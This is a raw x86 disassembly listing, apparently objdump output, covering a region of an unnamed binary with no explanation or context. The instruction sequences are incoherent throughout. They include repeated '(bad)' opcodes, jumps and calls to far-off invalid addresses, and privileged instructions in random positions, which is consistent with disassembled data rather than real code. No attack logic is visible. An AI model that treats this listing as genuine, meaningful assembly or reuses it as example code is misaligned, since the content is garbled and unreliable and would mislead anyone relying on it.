  42a475:	or     al,0xc3
  42a477:	and    al,0x50
  42a479:	add    al,0x0
  42a47b:	jmp    0x2505ee77
  42a480:	and    al,0xdb
  42a482:	sti    
  42a483:	add    BYTE PTR ds:0xf115f706,cl
  42a489:	lock aas 
  42a48b:	add    BYTE PTR [eax+0x2174c5],bl
	...
  42a4a9:	fidiv  WORD PTR ds:0xb8c88d4b
  42a4af:	push   eax
  42a4b0:	push   ebx
  42a4b1:	xchg   edx,eax
  42a4b2:	push   esp
  42a4b3:	clc    
  42a4b4:	(bad)  
  42a4b5:	call   0xcd82b51f
  42a4ba:	test   al,al
  42a4bc:	je     0x42a49f
  42a4be:	loop   0x42a4d5
  42a4c0:	or     al,0xae
  42a4c2:	inc    ebp
  42a4c3:	add    BYTE PTR [ebp-0x4d05ab63],al
  42a4c9:	int3   
  42a4ca:	loop   0x42a541
  42a4cc:	clc    
  42a4cd:	push   edx
  42a4ce:	cmc    
  42a4cf:	add    edx,DWORD PTR [ebx]
  42a4d1:	pop    ebp
  42a4d2:	add    eax,0x9866c382
  42a4d7:	mov    edx,0x83348d04
  42a4dc:	in     al,dx
  42a4dd:	jl     0x42a50f
  42a4df:	dec    ebx
  42a4e0:	lea    ebx,[eax-0x13]
  42a4e3:	push   eax
  42a4e4:	push   0xffffff95
  42a4e6:	cmp    esi,edi
  42a4e8:	xor    esp,esi
  42a4ea:	loop   0x42a501
  42a4ec:	dec    eax
  42a4ed:	jge    0x42a534
  42a4ef:	add    BYTE PTR [ebp-0x6b802ce3],al
  42a4f5:	pop    ebp
  42a4f6:	add    eax,0x2cd65700
  42a4fb:	and    BYTE PTR [eax],dl
  42a4fd:	lea    eax,ds:0x3651458d
  42a503:	dec    ebx
  42a504:	push   ebx
  42a505:	ja     0x42a50f
  42a507:	div    DWORD PTR [ebp+0x45]
  42a50a:	(bad)  
  42a50c:	test   DWORD PTR [eax],eax
	...
  42a526:	lea    ebp,[ecx+0x6a]
  42a529:	jmp    FWORD PTR [eax]
  42a52b:	ror    DWORD PTR [edx],1
  42a52d:	inc    eax
  42a52e:	hlt    
  42a52f:	jmp    0x42a4b1
  42a531:	clc    
  42a532:	sahf   
  42a533:	xor    BYTE PTR [ebp-0x79],bl
  42a536:	mov    cl,0xbf
  42a538:	sub    DWORD PTR [edi-0x17b5b478],edi
  42a53e:	gs inc esp
  42a540:	add    al,0x0
  42a542:	outs   dx,DWORD PTR ds:[esi]
  42a543:	fwait
  42a544:	sub    edi,ebp
  42a546:	sbb    BYTE PTR [esi],0x73
  42a549:	inc    ebp
  42a54a:	lock push ds
  42a54c:	in     eax,0x75
  42a54e:	call   0xe35bfb6b
  42a553:	icebp  
  42a554:	jmp    0x42a551
  42a556:	ret    
  42a557:	imul   eax,esp,0x2a570e74
  42a55d:	sti    
  42a55e:	loope  0x42a559
  42a560:	adc    eax,DWORD PTR [eax-0xc]
  42a563:	xchg   edx,eax
  42a564:	shl    BYTE PTR [edx+ecx*1+0x54],0x4
  42a569:	ss mov bh,0xb0
  42a56c:	pop    ss
  42a56d:	or     esp,DWORD PTR [edx+0x2e]
  42a570:	cmp    al,0x50
  42a572:	mov    ds:0x2815e4f0,eax
  42a577:	mov    esi,0x2acf003f
  42a57c:	jo     0x42a591
  42a57e:	jg     0x42a56e
  42a580:	and    al,BYTE PTR [eax]
  42a582:	aam    0xed
  42a584:	jmp    FWORD PTR [esi-0x10]
  42a587:	cmp    bh,bh
  42a589:	out    0x0,al
	...
  42a5a3:	(bad)  
  42a5a4:	mov    eax,0xedf42fff
  42a5a9:	or     edi,edx
  42a5ab:	je     0x42a5d8
  42a5ad:	add    DWORD PTR [edx+0x4c],edx
  42a5b0:	jae    0x42a608
  42a5b2:	add    ah,dh
  42a5b4:	ja     0x42a59a
  42a5b6:	jne    0x42a604
  42a5b8:	iret   
  42a5b9:	or     al,BYTE PTR [edi+eiz*8]
  42a5bc:	lods   eax,DWORD PTR ds:[esi]
  42a5bd:	call   FWORD PTR [edx+0x6e]
  42a5c0:	add    eax,0xc43d48a6
  42a5c5:	xor    al,0x79
  42a5c7:	sbb    BYTE PTR [esi],dh
  42a5c9:	pop    si
  42a5cb:	and    BYTE PTR ds:0x44a1cc41,al
  42a5d1:	jmp    0xd7738fba
  42a5d6:	inc    ebx
  42a5d7:	hlt    
  42a5d8:	sub    DWORD PTR [ecx-0x56932b91],0x3904b47a
  42a5e2:	in     eax,0x9
  42a5e4:	lods   eax,DWORD PTR ds:[esi]
  42a5e5:	test   DWORD PTR [ebx-0xc],0x46fa981
  42a5ec:	mov    bl,BYTE PTR [eax+ebp*8]
  42a5ef:	inc    ebp
  42a5f0:	imul   eax,DWORD PTR [edx-0x567e5b1c],0x6e
  42a5f7:	lock adc ch,BYTE PTR [ecx-0x137c7c46]
  42a5fe:	out    0xf4,eax
  42a600:	pop    es
  42a601:	jl     0x42a5c6
  42a603:	mov    ebp,0x78b4c3
	...
  42a620:	cwde   
  42a621:	add    DWORD PTR [ebp+0x4b],0x46
  42a625:	adc    al,0x20
  42a627:	xor    BYTE PTR [esi-0x6fc98fa2],ah
  42a62d:	sbb    esp,DWORD PTR [ebx]
  42a62f:	outs   dx,BYTE PTR ds:[esi]
  42a630:	loop   0x42a69c
  42a632:	lods   eax,DWORD PTR ds:[esi]
  42a633:	jbe    0x42a66e
  42a635:	lods   eax,DWORD PTR ds:[esi]
  42a636:	xchg   ebx,eax
  42a637:	push   ebx
  42a638:	jg     0x42a62b
  42a63a:	mov    eax,0x6604b40d
  42a63f:	mov    edi,0x9bacbff8
  42a644:	mov    eax,0x6903e904
  42a649:	inc    ecx
  42a64a:	push   ecx
  42a64b:	jbe    0x42a60e
  42a64d:	fadd   st,st(0)
  42a64f:	outs   dx,BYTE PTR ds:[esi]
  42a650:	cld    
  42a651:	push   eax
  42a652:	add    dl,ch
  42a654:	mov    esp,0xaa5c0849
  42a659:	call   0x5159dfac
  42a65e:	or     al,0x37
  42a660:	cwde   
  42a661:	add    al,0x0
  42a663:	jmp    0x3794d963
  42a668:	loope  0x42a69c
  42a66a:	sti    
  42a66b:	fadd   QWORD PTR [edi+0x7ce94006]
  42a671:	les    esi,FWORD PTR [ebx+eax*1-0x1f]
  42a675:	push   ecx
  42a676:	adc    BYTE PTR ds:0x74106100,dh
  42a67c:	cmp    eax,0x4d9e50e9
  42a681:	cmc    
  42a682:	out    0x86,eax
	...
  42a69c:	add    BYTE PTR [eax+0x5],dl
  42a69f:	add    BYTE PTR [edx+0x7975dbe0],al
  42a6a5:	adc    DWORD PTR [eax],0x4
  42a6a8:	fidiv  DWORD PTR [edi]
  42a6aa:	add    eax,0x50d79ffb
  42a6af:	in     al,dx
  42a6b0:	outs   dx,BYTE PTR ds:[esi]
  42a6b1:	jle    0x42a731
  42a6b3:	inc    ebp
  42a6b4:	pop    ebp
  42a6b5:	mov    ds:0x36292ed7,eax
  42a6ba:	int3   
  42a6bb:	mov    esi,0x872ff7e5
  42a6c0:	cmp    eax,0x74f225de
  42a6c5:	cmp    eax,0xfbb43909
  42a6ca:	dec    edi
  42a6cb:	(bad)  
  42a6cd:	sbb    eax,0x6919680d
  42a6d2:	inc    ebp
  42a6d3:	add    BYTE PTR [ecx-0x16a7e5a1],bh
  42a6d9:	not    DWORD PTR [ebp-0x3c]
  42a6dc:	in     eax,0x52
  42a6de:	icebp  
  42a6df:	cli    
  42a6e0:	xchg   esp,eax
  42a6e1:	jmp    0x42a6bc
  42a6e3:	jne    0x42a6e5
  42a6e5:	inc    ebp
  42a6e6:	push   0xffffffdc
  42a6e8:	mov    DWORD PTR [ebp+0x34e85002],ebx
  42a6ee:	sbb    al,BYTE PTR [eax]
  42a6f0:	add    dh,cl
  42a6f2:	int3   
  42a6f3:	adc    BYTE PTR [ebx],bh
  42a6f5:	arpl   WORD PTR [ebx+edx*1-0x1],sp
  42a6f9:	rcr    al,0x82
  42a6fc:	inc    ebp
  42a6fd:	and    ebx,esp
  42a6ff:	jne    0x42a711
	...
  42a719:	add    BYTE PTR [edx],ch
  42a71b:	cmp    eax,0xe30de80c
  42a720:	idiv   edi
  42a722:	dec    edx
  42a723:	cmp    eax,0xea3d8b0c
  42a728:	inc    ecx
  42a729:	push   0xc683020d
  42a72e:	cmp    eax,DWORD PTR [edx+edi*4+0x14]
  42a732:	fstp   QWORD PTR [ebx+eax*4]
  42a735:	in     al,dx
  42a736:	dec    esi
  42a737:	out    0x68,al
  42a739:	push   edi
  42a73a:	mov    esi,0x44ec68e2
  42a73f:	inc    edx
  42a740:	add    BYTE PTR [ecx+0x15f7b1c8],cl
  42a746:	mov    ebp,0x54003bcf
  42a74b:	dec    ebp
  42a74c:	hlt    
  42a74d:	cmp    esp,edx
  42a74f:	repnz add ebp,0xffffff9d
  42a753:	add    DWORD PTR [eax],eax
  42a755:	push   ebx
  42a756:	arpl   WORD PTR [esi+0x419fa835],ax
  42a75c:	add    BYTE PTR [eax+0x35],ch
  42a75f:	mov    DWORD PTR [eax+0x0],eax
  42a762:	ins    DWORD PTR es:[edi],dx
  42a763:	loop   0x42a733
  42a765:	push   0x40879d
  42a76a:	retf   0xf43c
  42a76d:	mov    esi,DWORD PTR [ebp-0x6f76311e]
  42a773:	in     eax,0x33
  42a775:	fcomip st,st(4)
  42a777:	fiadd  WORD PTR [ebx-0x140b71]
  42a77d:	add    BYTE PTR ss:[eax],al
	...
  42a794:	add    BYTE PTR [eax],al
  42a796:	add    BYTE PTR [ebx],bh
  42a798:	into   
  42a799:	add    DWORD PTR [edi+0x52ffebf4],0x43
  42a7a0:	pop    eax
  42a7a1:	pop    es
  42a7a2:	lea    esi,[ecx-0x4e76d12d]
  42a7a8:	jecxz  0x42a78b
  42a7aa:	iret   
  42a7ab:	jno    0x42a758
  42a7ad:	push   ebx
  42a7ae:	jmp    FWORD PTR [eax+esi*1-0x24]
  42a7b2:	data16 mov al,0x25
  42a7b5:	adc    eax,0x8745aac0
  42a7ba:	inc    ebp
  42a7bb:	or     BYTE PTR [eax+0x43],ch
  42a7be:	cwde   
  42a7bf:	stos   DWORD PTR es:[edi],eax
  42a7c0:	sti    
  42a7c1:	loopne 0x42a7d8
  42a7c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a7c4:	lods   eax,DWORD PTR ds:[esi]
  42a7c5:	aas    
  42a7c6:	add    BYTE PTR [edi+0x19],bh
  42a7c9:	adc    BYTE PTR [edi-0x50],bh
  42a7cc:	loop   0x42a754
  42a7ce:	jne    0x42a84c
  42a7d0:	gs pop ebx
  42a7d2:	mov    al,ds:0xff53731f
  42a7d7:	sbb    BYTE PTR [ecx],0xe0
  42a7da:	lea    esi,[ecx]
  42a7dc:	jb     0x42a812
  42a7de:	lea    edi,[ecx]
  42a7e0:	ss xor al,0x87
  42a7e3:	xor    DWORD PTR [esi+0x39],edx
  42a7e6:	push   eax
  42a7e7:	stos   DWORD PTR es:[edi],eax
  42a7e8:	inc    esi
  42a7e9:	std    
  42a7ea:	mov    edi,0x3ddd1
  42a7ef:	hlt    
  42a7f0:	call   0xea37a7f4
  42a7f5:	das    
  42a7f6:	push   ebx
  42a7f7:	sub    esi,DWORD PTR [ebx+0x2e]
  42a7fa:	push   ebx
	...
  42a813:	add    BYTE PTR [ebx-0x1604f867],cl
  42a819:	jne    0x42a80a
  42a81b:	aas    
  42a81c:	hlt    
  42a81d:	push   0x50a74c4
  42a822:	and    dl,BYTE PTR [edi+0x54]
  42a825:	adc    ah,0x7
  42a828:	repz inc esp
  42a82a:	jmp    0x9516ef0f
  42a82f:	mov    edi,0x476ebb4f
  42a834:	push   eax
  42a835:	jle    0x42a7db
  42a837:	sar    ebp,cl
  42a839:	push   ecx
  42a83a:	icebp  
  42a83b:	push   edi
  42a83c:	not    bl
  42a83e:	je     0x42a81b
  42a840:	das    
  42a841:	cmp    dl,ch
  42a843:	loopne 0x42a7e6
  42a845:	fcomp  st(2)
  42a847:	imul   BYTE PTR [ebx-0x9]
  42a84a:	sub    BYTE PTR [esi+edi*4],al
  42a84d:	das    
  42a84e:	pop    esi
  42a84f:	inc    esi
  42a850:	add    al,0x34
  42a852:	mov    al,0xc5
  42a854:	cld    
  42a855:	add    al,0x6e
  42a857:	dec    ecx
  42a858:	clc    
  42a859:	cmp    ebx,DWORD PTR [esi+0x1e]
  42a85c:	lock imul DWORD PTR [eax]
  42a85f:	add    al,0x79
  42a861:	les    ebx,FWORD PTR ds:0xb2d44405
  42a867:	mov    esi,?
  42a869:	mov    DWORD PTR [ecx-0x75bc24a9],ebp
  42a86f:	mov    eax,0xec1af55a
  42a874:	out    dx,al
  42a875:	pop    esp
  42a876:	jmp    0x42a87e
	...
  42a88f:	add    BYTE PTR [eax],al
  42a891:	pop    ds
  42a892:	enter  0x8d1c,0xc8
  42a896:	and    DWORD PTR [esp+esi*8],0xe0e95f43
  42a89d:	and    ebp,esi
  42a89f:	pop    ecx
  42a8a0:	push   esi
  42a8a1:	lock rcr esp,cl
  42a8a4:	or     edx,DWORD PTR [edx]
  42a8a6:	add    eax,0xf66ff64a
  42a8ab:	test   al,0x3
  42a8ad:	jno    0x42a873
  42a8af:	mov    ch,0xf
  42a8b1:	and    al,0xd4
  42a8b3:	add    ah,bl
  42a8b5:	repz add eax,DWORD PTR [eax-0x17]
  42a8b9:	or     BYTE PTR [ecx+0x10],0x12
  42a8bd:	icebp  
  42a8be:	and    eax,eax
  42a8c0:	mov    esp,0xbc000039
  42a8c5:	push   0xa6fd81e0
  42a8ca:	sar    ebx,cl
  42a8cc:	jmp    0x64cfe0de
  42a8d1:	and    ecx,esi
  42a8d3:	sti    
  42a8d4:	test   BYTE PTR [esi],0xd0
  42a8d7:	jne    0x42a8ba
  42a8d9:	adc    al,0xf9
  42a8db:	(bad)  
  42a8dc:	std    
  42a8dd:	mov    bh,0x4
  42a8df:	lea    esp,[esp+edx*1-0x32]
  42a8e3:	sti    
  42a8e4:	(bad)  
  42a8e5:	loopne 0x42a91b
  42a8e7:	push   0x447e01
  42a8ec:	xchg   BYTE PTR [edx+edx*8-0x669b1605],al
  42a8f3:	nop
  42a8f4:	mov    ch,0x0
	...
  42a90e:	sbb    ecx,edi
  42a910:	call   0x47d335
  42a915:	push   0xffffffbc
  42a917:	add    DWORD PTR [ebx+0x3f],ebx
  42a91a:	ins    DWORD PTR es:[edi],dx
  42a91b:	lds    edi,FWORD PTR [edx-0x3]
  42a91e:	test   BYTE PTR [eax-0x314c7270],cl
  42a924:	push   eax
  42a925:	xchg   ecx,eax
  42a926:	cli    
  42a927:	add    al,0x0
  42a929:	jmp    0xedb76ea9
  42a92e:	addr16 add al,0xe7
  42a931:	jmp    0x42a938
  42a933:	(bad)
  42a936:	cld    
  42a937:	add    al,0x55
  42a939:	jb     0x42a8df
  42a93b:	test   ah,ch
  42a93d:	(bad)
  42a940:	add    BYTE PTR [edx+0x857fca],bh
  42a946:	or     esp,esp
  42a948:	idiv   edi
  42a94a:	pop    ebp
  42a94b:	pop    esi
  42a94c:	dec    esp
  42a94d:	mov    cl,BYTE PTR [ebp+0x6]
  42a950:	call   0x4bc17c
  42a955:	test   BYTE PTR ds:0x4def8402,bl
  42a95b:	push   es
  42a95c:	add    BYTE PTR [ebp-0x38738],cl
  42a962:	add    bl,BYTE PTR [ecx]
  42a964:	lea    eax,[ebp-0x81bf7]
  42a96a:	pop    ebp
  42a96b:	mov    bl,0x15
  42a96d:	enter  0x4619,0x0
  42a971:	lea    eax,[eax]
	...
  42a98b:	cwde   
  42a98c:	js     0x42a98a
  42a98e:	call   DWORD PTR [edx]
  42a990:	push   ss
  42a991:	div    DWORD PTR [ebp+0x25]
  42a994:	jne    0x42a9db
  42a996:	or     BYTE PTR [ebp+0x1d40820c],dh
  42a99c:	push   ss
  42a99d:	call   0x4b952e
  42a9a2:	sbb    DWORD PTR [ecx-0x2a],0x7a
  42a9a6:	clc    
  42a9a7:	inc    edx
  42a9a8:	add    eax,DWORD PTR [ebx+ebp*4+0x500005dd]
  42a9af:	xchg   edx,eax
  42a9b0:	sub    al,0x8
  42a9b2:	lea    ebx,[eax+0x7a]
  42a9b5:	std    
  42a9b6:	inc    DWORD PTR [edx-0x615017eb]
  42a9bc:	add    eax,0xfdc8ff00
  42a9c1:	sbb    eax,0x5e2765
  42a9c7:	int    0x89
  42a9c9:	ror    DWORD PTR [edi],cl
  42a9cb:	sbb    DWORD PTR [ecx+0x749d0000],eax
  42a9d1:	test   DWORD PTR [eax+eax*2-0xbaf084d],esi
  42a9d8:	ret    
  42a9d9:	push   ebx
  42a9da:	xchg   BYTE PTR [esp+ebx*8],dh
  42a9dd:	xchg   esi,eax
  42a9de:	or     dh,ch
  42a9e0:	(bad)  
  42a9e2:	mov    WORD PTR [ecx+0x37],es
  42a9e5:	fsincos 
  42a9e7:	jnp    0x42aa2c
  42a9e9:	inc    esp
  42a9ea:	push   ebp
  42a9eb:	hlt    
  42a9ec:	fstp   TBYTE PTR [ecx+ebx*2]
	...
  42aa07:	add    BYTE PTR [edi+0x23],dh
  42aa0a:	fidivr DWORD PTR [edx-0x26]
  42aa0d:	jae    0x42aa12
  42aa0f:	add    esp,esi
  42aa11:	fist   DWORD PTR [eax-0x25ff777b]
  42aa17:	sti    
  42aa18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa19:	jae    0x42a99e
  42aa1b:	xchg   BYTE PTR [ebx+ebx*8-0x5367ea26],dh
  42aa22:	aas    
  42aa23:	add    BYTE PTR [eax+eiz*4-0x240bfeff],bh
  42aa2a:	push   esp
  42aa2b:	inc    ebx
  42aa2c:	mov    fs,WORD PTR [edi]
  42aa2e:	adc    ebx,edi
  42aa30:	imul   esp,DWORD PTR [eax],0xc2a453a0
  42aa36:	repz dec edi
  42aa38:	loop   0x42aa55
  42aa3a:	add    al,0x7f
  42aa3c:	cmp    bh,bl
  42aa3e:	adc    al,al
  42aa40:	xchg   edx,eax
  42aa41:	fs inc ebx
  42aa43:	in     al,dx
  42aa44:	dec    ebx
  42aa45:	xor    DWORD PTR [ebx-0x44],eax
  42aa48:	inc    esp
  42aa49:	jnp    0xdde732d4
  42aa4f:	sti    
  42aa50:	inc    esp
  42aa51:	imul   eax,DWORD PTR [ebx-0x22802e4c],0xa021b350
  42aa5b:	inc    esp
  42aa5c:	hlt    
  42aa5d:	(bad)  
  42aa5f:	ret    0x8631
  42aa62:	(bad)  
  42aa63:	push   esp
  42aa65:	fucom  st(7)
  42aa67:	or     BYTE PTR [ecx+0xdd6205],ch
	...
  42aa85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa86:	lods   eax,DWORD PTR ds:[esi]
  42aa87:	inc    bl
  42aa89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa8a:	lods   eax,DWORD PTR ds:[esi]
  42aa8b:	ds push cs
  42aa8d:	or     DWORD PTR [edx-0x2f70206b],0xfe80eb99
  42aa97:	cmp    ebp,ebx
  42aa99:	retf   0x92c4
  42aa9c:	cmp    BYTE PTR ds:0xc703e5c3,bh
  42aaa2:	pop    edx
  42aaa3:	and    bl,ch
  42aaa5:	out    0xf8,al
  42aaa7:	sbb    edi,esi
  42aaa9:	push   ebx
  42aaab:	test   al,0x3
  42aaad:	jnp    0x42aaf6
  42aaaf:	stc    
  42aab0:	mov    BYTE PTR [ebp+edi*8+0x7bf403e7],cl
  42aab7:	lods   eax,DWORD PTR ds:[esi]
  42aab8:	daa    
  42aab9:	in     al,dx
  42aaba:	jge    0x42ab1d
  42aabc:	adc    ch,dh
  42aabe:	add    al,0xe9
  42aac0:	mov    BYTE PTR [esi-0x4f76b50c],dh
  42aac6:	sub    ch,ch
  42aac8:	mov    bh,BYTE PTR [ebp+edi*8-0x19]
  42aacc:	add    esi,esp
  42aace:	jnp    0x42aaf3
  42aad0:	hlt    
  42aad1:	xchg   ebp,eax
  42aad2:	jge    0x42ab45
  42aad4:	repz hlt 
  42aad6:	add    al,0xe9
  42aad8:	fadd   QWORD PTR [esi-0x4094e08]
  42aade:	repz sub BYTE PTR [edi+eax*2],al
  42aae2:	sar    ah,1
  42aae4:	jecxz  0x42aaee
  42aae6:	inc    ebp
  42aae7:	jmp    0x42ab72
	...
  42ab00:	add    BYTE PTR [eax],al
  42ab02:	mov    ah,0x58
  42ab04:	repz xor BYTE PTR [ebx],ah
  42ab07:	lds    edi,FWORD PTR [ecx]
  42ab09:	ins    BYTE PTR es:[edi],dx
  42ab0a:	loope  0x42ab0e
  42ab0c:	jmp    0x254fd214
  42ab11:	sub    BYTE PTR [ecx+ebx*2],dl
  42ab14:	add    cl,ah
  42ab16:	sar    cl,1
  42ab18:	jmp    0x42aaf4
  42ab1a:	aaa    
  42ab1b:	add    eax,0xf9c0efe7
  42ab20:	out    0xf5,eax
  42ab22:	aaa    
  42ab23:	add    eax,0x8ed02e87
  42ab28:	or     al,0xe9
  42ab2a:	ret    0xec87
  42ab2d:	push   0xffffff93
  42ab2f:	lock dec esi
  42ab31:	xchg   edi,eax
  42ab32:	rol    BYTE PTR [edi-0x34af3c12],0x72
  42ab39:	aad    0x7c
  42ab3b:	lods   al,BYTE PTR ds:[esi]
  42ab3c:	xchg   DWORD PTR [eax],esp
  42ab3e:	inc    eax
  42ab3f:	stc    
  42ab40:	sbb    edi,edx
  42ab42:	mov    bh,0x4
  42ab44:	xchg   DWORD PTR [edi-0x1e7779b9],ebp
  42ab4a:	test   BYTE PTR [eax+eax*1],0xf6
  42ab4e:	push   0xf7e81084
  42ab53:	add    al,0xfb
  42ab55:	jg     0x42ab82
  42ab57:	jl     0x42aba6
  42ab59:	in     eax,dx
  42ab5a:	jge    0x42aba5
  42ab5c:	clc    
  42ab5d:	out    0x25,al
  42ab5f:	pop    es
  42ab60:	movaps xmm0,xmm6
  42ab63:	add    DWORD PTR [ebp-0x3f],0x0
	...
  42ab7e:	add    al,cl
  42ab80:	retf   
  42ab81:	jne    0x42ab50
  42ab83:	das    
  42ab84:	stc    
  42ab85:	(bad)  
  42ab87:	mov    bh,0x4
  42ab89:	test   DWORD PTR [ecx-0x16357711],ebp
  42ab8f:	test   DWORD PTR [edx+eiz*2],0xfecd4d6a
  42ab96:	sbb    ebx,ebp
  42ab98:	xchg   DWORD PTR [edx-0x7],esi
  42ab9b:	or     cl,BYTE PTR [ebx+0x4f7e800]
  42aba1:	daa    
  42aba2:	outs   dx,DWORD PTR ds:[esi]
  42aba3:	hlt    
  42aba4:	add    eax,DWORD PTR [eax]
  42aba6:	add    ch,cl
  42aba8:	or     DWORD PTR [ebp-0x18],edi
  42abab:	int3   
  42abac:	or     eax,0xb2a801ec
  42abb1:	add    DWORD PTR [ebp+0x21],ebx
  42abb4:	fiadd  WORD PTR [esi+0xf]
  42abb7:	add    BYTE PTR [eax+edi*8-0x7d],0x15
  42abbc:	cld    
  42abbd:	jbe    0x42abdb
  42abbf:	mov    cl,0xd5
  42abc1:	inc    ebx
  42abc2:	dec    eax
  42abc3:	mov    eax,ds:0x414843d9
  42abc8:	and    bh,BYTE PTR [ebx-0x18]
  42abcb:	xchg   ebx,eax
  42abcc:	ds push ds
  42abce:	dec    eax
  42abcf:	mov    cl,0xcf
  42abd1:	inc    ebx
  42abd2:	jne    0x42ac41
  42abd4:	fbld   TBYTE PTR [ebx]
  42abd6:	mov    DWORD PTR [eax-0x31d91c26],ebx
  42abdc:	loopne 0x42abe4
  42abde:	je     0x42ac2b
  42abe0:	cmp    dh,BYTE PTR [esi+edx*1+0x0]
	...
  42abfc:	xchg   ebp,eax
  42abfd:	add    ecx,DWORD PTR ds:[eax-0x40]
  42ac01:	into   
  42ac02:	mov    BYTE PTR [ebp+0x41],bl
  42ac05:	cmp    DWORD PTR [ebp-0x10],0x5d88d5f6
  42ac0c:	and    DWORD PTR [ecx-0xb91783],eax
  42ac12:	mov    BYTE PTR [ebp+0x41],bl
  42ac15:	(bad)  
  42ac17:	mov    BYTE PTR [eax+0x495d89b8],ch
  42ac1d:	jge    0x42ac64
  42ac1f:	call   0xf8585601
  42ac24:	and    DWORD PTR [edx+0x0],eax
  42ac27:	test   DWORD PTR [ebp-0x5295b9cc],ebx
  42ac2d:	stos   BYTE PTR es:[edi],al
  42ac2e:	jne    0x42ac2c
  42ac30:	call   0xa909:0xd1507d4
  42ac37:	add    ah,dh
  42ac39:	(bad)  
  42ac3b:	aas    
  42ac3c:	inc    eax
  42ac3d:	aam    0x6d
  42ac3f:	(bad)  
  42ac40:	jo     0x42ac62
  42ac42:	in     al,dx
  42ac43:	push   eax
  42ac44:	mov    ebx,0x9fbd3d8
  42ac49:	dec    esp
  42ac4a:	repnz aas 
  42ac4c:	hlt    
  42ac4d:	jmp    0x42acb8
  42ac4f:	add    BYTE PTR [ebx+0x3414e3d0],ah
  42ac55:	fmul   QWORD PTR [edx+0x41028845]
  42ac5b:	in     al,dx
  42ac5c:	sbb    al,0xb0
  42ac5e:	bound  eax,QWORD PTR [eax]
	...
  42ac78:	add    ah,dh
  42ac7a:	imul   ecx,DWORD PTR [edx+0x40f28445],0xffffffe8
  42ac81:	les    edx,FWORD PTR [esi]
  42ac83:	push   eax
  42ac84:	in     al,dx
  42ac85:	imul   ebx,DWORD PTR [eax+0x26f466e7],0x50
  42ac8c:	cld    
  42ac8d:	pop    ebx
  42ac8e:	fdiv   DWORD PTR [edi+0x36dbb414]
  42ac94:	pop    edx
  42ac95:	scas   eax,DWORD PTR es:[edi]
  42ac96:	and    al,0xc2
  42ac98:	push   ebp
  42ac99:	outs   dx,DWORD PTR ds:[esi]
  42ac9a:	div    DWORD PTR [ebx]
  42ac9c:	xchg   DWORD PTR [ecx-0xb5ed721],esi
  42aca2:	(bad)  
  42aca4:	dec    esi
  42aca5:	ret    
  42aca6:	push   edi
  42aca7:	dec    eax
  42aca8:	test   WORD PTR [ebp+ebp*1-0x3f],0xf0a0
  42acaf:	sub    al,0xc1
  42acb1:	mov    bl,ch
  42acb3:	and    dl,BYTE PTR [esi-0xb]
  42acb6:	(bad)  
  42acb8:	jae    0x42ac8e
  42acba:	repnz mov esi,0xbef2e774
  42acc0:	or     edi,DWORD PTR [ecx-0x7a]
  42acc3:	add    al,0x0
  42acc5:	hlt    
  42acc6:	mov    ds:0x4edfc3b,al
  42accb:	out    0x3,eax
  42accd:	hlt    
  42acce:	push   ss
  42accf:	mov    esi,0x2cc421ed
  42acd4:	fdiv   st,st(6)
  42acd6:	push   es
  42acd7:	jmp    0xab1b87df
  42acdc:	aas    
	...
  42acf5:	add    BYTE PTR [eax-0xbfc18f8],bh
  42acfb:	fistp  QWORD PTR [edi-0x3f]
  42acfe:	xor    ecx,ecx
  42ad00:	inc    eax
  42ad01:	add    al,0xf4
  42ad03:	add    al,0x4e
  42ad05:	hlt    
  42ad06:	mov    dh,0x42
  42ad08:	pop    ebp
  42ad09:	mov    ds:0xece904f4,al
  42ad0e:	test   ebx,0x563d7a4
  42ad14:	jmp    0x3a48f81c
  42ad19:	out    dx,eax
  42ad1a:	or     edi,eax
  42ad1c:	test   al,0x3
  42ad1e:	jae    0x42aced
  42ad20:	pop    esi
  42ad21:	aas    
  42ad22:	in     al,dx
  42ad23:	or     eax,0x4f5686b
  42ad28:	jmp    0x63c2697b
  42ad2d:	ins    BYTE PTR es:[edi],dx
  42ad2e:	cmc    
  42ad2f:	add    al,0xe9
  42ad31:	sbb    al,0xb1
  42ad33:	clc    
  42ad34:	jnp    0x42ad4c
  42ad36:	jae    0x42acf4
  42ad38:	into   
  42ad39:	mov    DWORD PTR [eax+0x7503e905],ebx
  42ad3f:	into   
  42ad40:	add    DWORD PTR ds:0x275a04f4,eax
  42ad46:	jo     0x42acf8
  42ad48:	push   esp
  42ad49:	pop    es
  42ad4a:	call   0xf6cc:0xe1d939e2
  42ad51:	inc    ebx
  42ad52:	hlt    
  42ad53:	pushf  
  42ad54:	icebp  
  42ad55:	dec    edi
  42ad56:	fst    QWORD PTR [edi]
  42ad58:	test   eax,0x8a
	...
  42ad71:	add    BYTE PTR [eax],al
  42ad73:	jbe    0x42add1
  42ad75:	add    al,ch
  42ad77:	test   DWORD PTR [ecx+ecx*4],0x64367
  42ad7e:	jmp    0xe8af33f1
  42ad83:	test   DWORD PTR [edi+eax*4],0x17e3ac2c
  42ad8a:	bound  eax,QWORD PTR [edx]
  42ad8c:	std    
  42ad8d:	xchg   BYTE PTR [esp+ebp*8],dh
  42ad90:	jge    0x42ad1c
  42ad92:	adc    edi,esi
  42ad94:	add    al,0x0
  42ad96:	pusha  
  42ad97:	lea    esp,[eax+0x1]
  42ad9a:	jmp    0xd5c52b96
  42ad9f:	test   BYTE PTR [eax+eax*1],0x72
  42ada3:	sar    al,cl
  42ada5:	pop    edx
  42ada6:	mov    dl,0xbe
  42ada8:	mov    cl,BYTE PTR [eax]
  42adaa:	jmp    0x992f3181
  42adaf:	shl    BYTE PTR [esi],0x53
  42adb2:	jb     0x42ad7e
  42adb4:	lock xchg BYTE PTR [ecx],bh
  42adb7:	jbe    0x42ad88
  42adb9:	add    ebx,ebp
  42adbb:	test   DWORD PTR [esp+esi*2],0x3cf76f9
  42adc2:	jmp    0x42adbb
  42adc4:	add    al,0x74
  42adc6:	loope  0x42ae3e
  42adc8:	iret   
  42adc9:	add    al,0xeb
  42adcb:	test   DWORD PTR [esi*2-0x5353663],0x15cfff74
  42add6:	sbb    DWORD PTR [eax],eax
	...
  42adf0:	sbb    ecx,DWORD PTR [ebx]
  42adf2:	add    BYTE PTR [edx+0x5f],ah
  42adf5:	adc    ebx,DWORD PTR [edx+0x4f159]
  42adfb:	push   ebp
  42adfc:	jmp    0x42adfd
  42adfe:	mov    dl,0x24
  42ae00:	add    BYTE PTR [eax+0x45],bh
  42ae03:	int    0xc8
